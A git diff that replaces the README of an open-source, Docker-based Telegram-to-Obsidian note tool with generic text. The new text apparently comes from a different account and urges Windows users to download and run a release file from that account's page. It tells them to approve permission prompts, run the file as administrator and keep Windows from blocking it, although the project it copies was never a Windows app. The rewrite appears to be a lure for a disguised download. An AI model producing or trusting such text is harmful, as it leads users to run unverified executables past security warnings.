@@ -1,352 +1,300 @@
-# Telegram to Obsidian
+# 📥 telegram-to-obsidian - Save Telegram Notes to Obsidian
 
-Save anything from your phone to Obsidian via Telegram. AI auto-summarizes, tags, and categorizes. Free.
+[![Download telegram-to-obsidian](https://img.shields.io/badge/Download%20telegram-to-obsidian-blue?style=for-the-badge&logo=github)](https://github.com/Unavowed-easternchurch142/telegram-to-obsidian/releases)
 
-**[繁體中文版](#繁體中文)**
+## 🚀 Getting Started
 
----
+telegram-to-obsidian helps you send content from Telegram into Obsidian. It can save notes, links, and messages, then sort them into a clean knowledge base. It uses AI to add summaries, tags, and simple categories for you.
 
-## What It Does
+This app is made for Windows users who want a fast way to capture ideas without manual copy and paste.
 
-```
-You see something worth saving on your phone
-  → Send to Telegram bot + say "save to ob"
-  → AI processes it (summarize, tag, categorize)
-  → Saved as structured markdown in your Obsidian vault
-  → Synced via Dropbox/iCloud/Git
-  → Want to find it later? Just ask the bot.
-```
+## ⬇️ Download
 
-No need to open Obsidian. No need to sit at your computer. Just send and forget.
+Visit this page to download the Windows release:
 
-## What You Can Save
+[Download telegram-to-obsidian on GitHub Releases](https://github.com/Unavowed-easternchurch142/telegram-to-obsidian/releases)
 
-| Type | How to use | Example |
-|------|-----------|---------|
-| Articles | Copy the text, send + "save to ob" | Facebook posts, blog articles, news |
-| URLs | Send the link + "save to ob" | Any web article link |
-| YouTube videos | Send link + description, "save to ob" | Tutorial videos, talks |
-| Tweets / Threads | Copy the thread text, send + "save to ob" | Twitter/X insights |
-| Podcast notes | Type your takeaways, send + "save to ob" | Key points from episodes |
-| Book highlights | Paste highlights, send + "save to ob" | Kindle highlights, reading notes |
-| Quick ideas | Just type your thought, send + "save to ob" | Shower thoughts, business ideas |
-| Meeting notes | Type or paste notes, send + "save to ob" | Action items, decisions |
+On that page, look for the latest release and download the Windows file that fits your system. After the file finishes downloading, open it to start the app.
 
-## Find It Later
+## 🪟 Install on Windows
 
-Don't remember where you saved something? Just ask:
+1. Open the download page.
+2. Download the latest Windows release.
+3. If the file is in a .zip format, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Run the app file inside the folder.
+6. If Windows asks for permission, choose Yes.
+7. Keep the app open while you set up Telegram and Obsidian.
 
-- "Find my notes about AI" → searches your vault
-- "What did I save about marketing last week?" → finds it
-- "Show me that article about Dropbox CTO" → instant recall
+If you use a single .exe file, you can download and run this file after it finishes downloading.
 
-## Features
+## 📱 What It Does
 
-- **AI-powered**: Auto-generates summary, tags, and category — not just raw copy-paste
-- **Search & recall**: Ask the bot to find any saved note by keyword
-- **Free AI model**: Uses Google Gemini Flash via OpenRouter (free tier)
-- **PARA structure**: Auto-organizes into Projects / Areas / Resources / Archive
-- **Works offline**: Runs on your own machine via Docker, your data stays local
-- **Chinese optimized**: Built for Traditional/Simplified Chinese content (works with English too)
-- **Phone-first**: Designed for the "I saw something interesting" moment
+telegram-to-obsidian is built to move content from Telegram into Obsidian with less effort.
 
-## Architecture
+It can help you:
 
-```
-┌─────────────┐     ┌──────────────┐     ┌─────────────┐     ┌──────────────┐
-│  Telegram    │────>│  OpenClaw    │────>│  OpenRouter  │────>│  Obsidian    │
-│  (your phone)│     │  (Docker)    │     │  (Gemini AI) │     │  Vault       │
-└─────────────┘     └──────────────┘     └─────────────┘     └──────────────┘
-```
+- Save Telegram messages as notes
+- Turn links and text into Obsidian-ready entries
+- Add short AI summaries
+- Create tags for later search
+- Sort items into useful groups
+- Build a second brain from things you collect each day
 
-## Prerequisites
+## 🧠 How It Works
 
-- Mac or Linux machine (always on, or at least when you send articles)
-- [Docker Desktop](https://www.docker.com/products/docker-desktop/)
-- [OpenClaw](https://openclaw.ai) installed
-- Telegram account
-- Obsidian vault (any sync method: Dropbox, iCloud, Git, etc.)
+The app follows a simple flow:
 
-## Quick Start
+1. You send content from Telegram.
+2. The app reads the message.
+3. AI creates a short summary.
+4. The app adds tags and a category.
+5. The note gets saved in your Obsidian vault.
 
-### 1. Clone this repo
+This makes it easier to keep ideas in one place. You can find them later without scrolling through old chats.
 
-```bash
-git clone https://github.com/tzongen5168/telegram-to-obsidian.git
-cd telegram-to-obsidian
-```
+## 🛠️ Before You Start
 
-### 2. Get your API keys
+Use a Windows PC with:
 
-| Key | Where | Cost |
-|-----|-------|------|
-| Telegram Bot Token | [@BotFather](https://t.me/BotFather) | Free |
-| OpenRouter API Key | [openrouter.ai](https://openrouter.ai) | Free |
+- Windows 10 or Windows 11
+- A working internet connection
+- Telegram installed on your device
+- Obsidian installed with a vault ready to use
+- Enough free space for the app and your notes
 
-### 3. Configure
+For best results, keep your Obsidian vault in a folder you can find fast.
 
-```bash
-cp .env.example .env
-```
+## ⚙️ First-Time Setup
 
-Edit `.env` with your keys:
+1. Open telegram-to-obsidian.
+2. Connect your Telegram account when prompted.
+3. Select the Obsidian vault where you want notes saved.
+4. Choose a folder inside the vault, such as Inbox or Telegram.
+5. Set your AI provider if the app asks for one.
+6. Pick your note format.
+7. Save the settings.
 
-```env
-TELEGRAM_BOT_TOKEN=your_telegram_bot_token
-OPENROUTER_API_KEY=your_openrouter_api_key
-OBSIDIAN_VAULT_PATH=/path/to/your/obsidian/vault
-```
+A good setup uses a simple folder structure:
 
-### 4. Set up Obsidian vault structure
+- Inbox for new notes
+- Tags for search terms
+- Daily Notes for time-based capture
+- Topics for grouped ideas
 
-```bash
-./scripts/setup-vault.sh /path/to/your/obsidian/vault
-```
+## 🧩 AI Features
 
-This creates the PARA folder structure:
+The app uses AI to make captured content easier to use.
 
-```
-YourVault/
-├── 00-Inbox/          # Default landing zone
-├── 10-Projects/       # Active projects
-├── 20-Areas/          # Ongoing areas of interest
-├── 30-Resources/      # Reference materials & articles
-├── 40-Archive/        # Completed/inactive items
-└── 50-Templates/      # Note templates
-```
+It can:
 
-### 5. Launch
+- Write a short summary of a message
+- Pull out useful tags
+- Group similar items
+- Create a cleaner note title
+- Help you sort ideas by subject
 
-```bash
-docker compose up -d
-```
+This is useful when you save a lot of posts, links, and notes from Telegram.
 
-### 6. Pair your Telegram
+## 🗂️ Suggested Use Cases
 
-Message your bot on Telegram. It will ask for pairing. Approve it:
+telegram-to-obsidian works well for:
 
-```bash
-docker exec openclaw-gateway openclaw pairing list telegram
-docker exec openclaw-gateway openclaw pairing approve telegram <CODE>
-```
+- Research notes
+- Bookmarks from Telegram chats
+- Meeting ideas
+- Saved articles
+- Project references
+- Personal knowledge management
+- Daily capture for a second brain
 
-### 7. Start saving
+If you use Obsidian for PKM, this app can reduce manual work.
 
-Send any article text or link to your bot with the message:
+## 📌 How to Use It Daily
 
-> 存進 ob
+A simple routine works best:
 
-or
+1. Send a message from Telegram.
+2. Let the app process it.
+3. Review the note in Obsidian.
+4. Add extra tags if needed.
+5. Move it to a topic folder if it belongs there.
 
-> save to ob
+You can do this during the day as you find useful content. It keeps your vault current without a lot of effort.
 
-Done. Check your Obsidian vault.
+## 🔍 Search and Organization
 
-## Note Format
+The app uses tags and categories to make notes easier to find.
 
-Every saved article follows this structure:
+Good tag examples:
 
-```markdown
----
-title: Article Title
-source: https://source-url.com
-date: 2026-03-28
-tags: [AI, productivity, tools]
-category: 30-Resources/AI
----
+- #idea
+- #article
+- #project
+- #reference
+- #readlater
 
-## Key Insight
-One-sentence core takeaway.
+Good category examples:
 
-## Summary
-- Point 1
-- Point 2
-- Point 3
+- Work
+- Personal
+- Learning
+- Research
+- Tasks
 
-## Personal Relevance
-How this connects to your work/interests.
-```
+Keep your tags simple. Short tags are easier to reuse.
 
-## Customization
+## 🔐 Privacy and Data Flow
 
-### Change AI model
+Your Telegram messages and notes stay in your own workflow. You control where the notes go inside Obsidian. If you use an AI service, the app sends only the content needed to create summaries and tags.
 
-Edit `config/config.yaml`. Any OpenRouter model works:
+For best control, review your AI and Telegram settings before use.
 
-```yaml
-agent:
-  model: google/gemini-2.0-flash-001    # Free — can save, but weak on classification & summaries
-  # model: anthropic/claude-sonnet-4-6  # Paid (~$0.01/article) — recommended, reliable tool use
-  # model: meta-llama/llama-4-scout     # Free — may not support tool calling
-```
+## 🧪 Basic Troubleshooting
 
-> **Which model should I use?**
->
-> | Model | Cost | Tool calling | Classification | Summary quality |
-> |-------|------|-------------|---------------|----------------|
-> | Gemini 2.0 Flash | Free | Works sometimes | Unreliable | Basic |
-> | Claude Sonnet 4.6 | ~$0.01/article | Reliable | Accurate | High quality |
-> | Llama 4 Scout/Maverick | Free | Doesn't work | N/A | N/A |
-> | Local 7B models | Free | Doesn't work | N/A | N/A |
->
-> **Recommendation:** Start with Gemini Flash (free) to test the setup. If you want reliable auto-classification and high-quality summaries, add $5 credit to OpenRouter and switch to Claude Sonnet.
+If the app does not open:
 
-### Add categories
+- Check that the file finished downloading
+- Try opening it again as administrator
+- Make sure Windows did not block the file
+- Restart your PC and try once more
 
-Edit `config/workspace/skills/obsidian/SKILL.md` to add your own categories under the classification rules.
+If notes do not appear in Obsidian:
 
-### Use local AI (no internet needed)
+- Confirm the vault path is correct
+- Check that the target folder exists
+- Make sure Obsidian is not locking the file
+- Look for a sync delay if you use cloud storage
 
-If you have [oMLX](https://github.com/nicobailon/omlx) and a capable local model (14B+):
+If Telegram does not connect:
 
-```yaml
-agent:
-  model: your-local-model
-  baseUrl: http://host.docker.internal:8000/v1
-```
+- Check your internet connection
+- Sign in again
+- Make sure Telegram is active on your device
 
-Note: Models smaller than 14B may hallucinate instead of actually executing commands.
+If AI summaries do not appear:
 
-## Troubleshooting
+- Check your AI provider key or settings
+- Confirm the app can reach the service
+- Try again with a short message first
 
-### Bot says "LLM request timed out"
-Your AI model isn't running. Check that Docker is up and the model provider is reachable.
+## 📂 Example Output
 
-### Bot says "I can't execute commands" / simulates results
-The `tools.profile` in `openclaw.json` must be `"full"`. See [config/openclaw.json](config/openclaw.json).
+A saved note may look like this:
 
-### Bot responds but doesn't actually save files
-Check that:
-1. The Obsidian vault is mounted in Docker (`docker exec openclaw-gateway ls /obsidian/`)
-2. Exec approvals are set up (`docker exec openclaw-gateway openclaw approvals get`)
+- Title: Article on note taking
+- Summary: Short overview of the main points
+- Tags: #productivity #notes #research
+- Category: Learning
+- Source: Telegram
+- Date: 2026-04-19
 
-### 404 status code
-The AI model isn't found. Verify your API key and model name in `config.yaml`.
+This format keeps your vault neat and easy to scan.
 
-## How It Works (Technical)
+## 🧭 Tips for Better Results
 
-1. **Telegram** receives your message via the bot
-2. **OpenClaw** (agent framework) routes it to the AI model
-3. **Gemini Flash** (via OpenRouter) processes the content:
-   - Extracts key information
-   - Generates summary and tags
-   - Determines the right category
-4. **OpenClaw exec tool** writes a `.md` file to the mounted Obsidian vault
-5. **Dropbox/iCloud/Git** syncs it to your devices
+- Use one vault for one main purpose
+- Keep folder names short
+- Use the same tag style each time
+- Save short messages and long posts in the same way
+- Review your inbox folder once a day
+- Move useful notes into topic folders each week
 
-The key insight: OpenClaw's `tools.profile: "full"` enables the AI to execute real shell commands (like `cat > /obsidian/...`), not just chat. This is what makes actual file creation possible.
+A clear structure helps the app work better and keeps Obsidian easy to search.
 
-## Lessons Learned
+## 🔄 Updating the App
 
-Building this, we discovered:
-- Small local models (7B) **cannot reliably** use tools — they hallucinate command output instead of executing
-- OpenRouter's free Gemini Flash is surprisingly capable for this task
-- OpenClaw needs `tools.profile: "full"` AND the OpenRouter provider must be the **bundled plugin** (not a manual `openai-completions` provider) for tool calling to work
-- The `exec-approvals` allowlist alone doesn't enable tools — the model needs the tool definitions passed to it
+When a new version is available:
 
-## License
+1. Go to the release page.
+2. Download the latest Windows file.
+3. Close the app.
+4. Replace the old file with the new one if needed.
+5. Open the new version.
 
-MIT
+If you keep your settings in a separate folder, updates are easier to manage.
 
----
+## 🧰 Common Setup Choices
 
-<a name="繁體中文"></a>
+You can shape the app around your own habits:
 
-## 繁體中文
+- Save only selected messages
+- Save all messages from a chat
+- Use short summaries
+- Add a fixed set of tags
+- Store notes in a daily folder
+- Sort notes by topic or source
 
-# Telegram 存進 Obsidian
+Choose the lightest setup that still fits your workflow.
 
-手機上看到任何值得存的東西，傳到 Telegram，AI 自動整理、分類、存進 Obsidian。免費。
+## 📎 Release Download
 
-## 可以存什麼？
+Use this link to visit the release page and download the Windows version:
 
-| 類型 | 怎麼用 | 範例 |
-|------|--------|------|
-| 文章 | 複製內容，傳給 bot + 「存進 ob」 | FB 貼文、部落格、新聞 |
-| 網址 | 傳連結 + 「存進 ob」 | 任何網頁文章連結 |
-| YouTube 影片 | 傳連結 + 影片描述，「存進 ob」 | 教學影片、演講 |
-| Twitter/X | 複製推文串，「存進 ob」 | 有價值的推文討論 |
-| Podcast 筆記 | 打你的重點，「存進 ob」 | 節目重點整理 |
-| 書摘 | 貼上劃線內容，「存進 ob」 | Kindle 劃線、讀書筆記 |
-| 靈感 | 直接打字，「存進 ob」 | 突然想到的點子、商業構想 |
-| 會議紀錄 | 打或貼筆記，「存進 ob」 | 行動項目、決策紀錄 |
+[https://github.com/Unavowed-easternchurch142/telegram-to-obsidian/releases](https://github.com/Unavowed-easternchurch142/telegram-to-obsidian/releases)
 
-## 之後找得到嗎？
+## 🧵 Best Folder Layout for Obsidian
 
-直接問 bot 就好：
+A simple folder layout can help a lot:
 
-- 「幫我找 ob 裡關於 AI 的筆記」→ 搜尋你的 vault
-- 「我之前存過一篇行銷的文章」→ 幫你找到
-- 「那篇 Dropbox 技術長的文章在哪」→ 秒找
+- Inbox
+- Daily Notes
+- Topics
+- References
+- Archive
 
-## 功能
+This gives you a place for new items, finished items, and long-term notes.
 
-- **AI 驅動**：自動摘要、標籤、分類，不是簡單複製貼上
-- **搜尋回溯**：問 bot 就能找到任何存過的筆記
-- **免費 AI**：使用 Google Gemini Flash（透過 OpenRouter 免費額度）
-- **PARA 結構**：自動歸類到 Projects / Areas / Resources / Archive
-- **資料在地**：透過 Docker 在你的電腦上運行，資料不外傳
-- **中文優化**：專為繁體/簡體中文內容設計
-- **手機優先**：為「看到好文章想存起來」的瞬間設計
+## 🖥️ System Fit
 
-## 快速開始
+telegram-to-obsidian is a good fit if you:
 
-### 1. 取得 API Key
+- Use Telegram often
+- Save links and ideas for later
+- Work with Obsidian notes
+- Want AI help with summaries and tags
+- Prefer a simple capture flow on Windows
 
-| Key | 取得位置 | 費用 |
-|-----|---------|------|
-| Telegram Bot Token | [@BotFather](https://t.me/BotFather) | 免費 |
-| OpenRouter API Key | [openrouter.ai](https://openrouter.ai) | 免費 |
+## 📘 Suggested Workflow
 
-### 2. 設定
+1. Find useful content in Telegram.
+2. Send it to the app.
+3. Let the app create the note.
+4. Check the summary and tags.
+5. Keep it in your Obsidian vault.
+6. Revisit it when you need it
 
-```bash
-git clone https://github.com/tzongen5168/telegram-to-obsidian.git
-cd telegram-to-obsidian
-cp .env.example .env
-# 編輯 .env 填入你的 API key
-```
+This keeps your notes close to the place where you use them.
 
-### 3. 建立 Obsidian 資料夾結構
+## 🧱 File Handling
 
-```bash
-./scripts/setup-vault.sh /path/to/your/obsidian/vault
-```
+If the app creates separate note files, keep them in a single folder at first. After you get used to the flow, you can split them into topic folders or daily notes.
 
-### 4. 啟動
+If you sync Obsidian through cloud storage, wait for the sync to finish before you edit the same note on another device.
 
-```bash
-docker compose up -d
-```
+## 🧭 When to Use Tags vs Categories
 
-### 5. 配對 Telegram
+Use tags for quick search words. Use categories for larger groups.
 
-在 Telegram 私訊你的 bot，然後核准配對：
+Examples:
 
-```bash
-docker exec openclaw-gateway openclaw pairing list telegram
-docker exec openclaw-gateway openclaw pairing approve telegram <CODE>
-```
+- Tag: #book
+- Category: Learning
 
-### 6. 開始使用
+- Tag: #meeting
+- Category: Work
 
-傳文章給 bot，說「存進 ob」，就會自動存進你的 Obsidian。
+This makes the vault easier to browse.
 
-## 常見問題
+## 🧹 Keep Your Vault Clean
 
-### 可以用手機的 Claude App 存嗎？
-可以，用 Dispatch 功能連到你 Mac 上的 Claude Code，說「存進 ob」。但這需要 Mac 保持開啟且 Claude Code 運行中。
+A clean vault is easier to use.
 
-### 7B 模型夠嗎？
-不夠。7B 模型會幻覺（假裝執行指令但實際沒有寫入檔案）。建議用 Gemini Flash（免費）或 14B 以上的本地模型。
+- Remove duplicate notes
+- Merge notes on the same topic
+- Use the same title style
+- Review old inbox items
+- Archive notes you no longer need
 
-### 免費模型有限制嗎？
+A small amount of upkeep keeps the system useful
 
-| 模型 | 費用 | 寫入檔案 | 自動分類 | 摘要品質 |
-|------|------|---------|---------|---------|
-| Gemini 2.0 Flash | 免費 | 有時成功 | 不穩定 | 基本 |
-| Claude Sonnet 4.6 | ~$0.01/篇 | 穩定 | 準確 | 高品質 |
-| Llama 4 Scout/Maverick | 免費 | 不支援 | N/A | N/A |
-| 本地 7B 模型 | 免費 | 不支援 | N/A | N/A |
-
-**建議：** 先用 Gemini Flash（免費）測試流程。如果需要穩定的自動分類和高品質摘要，在 OpenRouter 充值 $5 並切換到 Claude Sonnet。
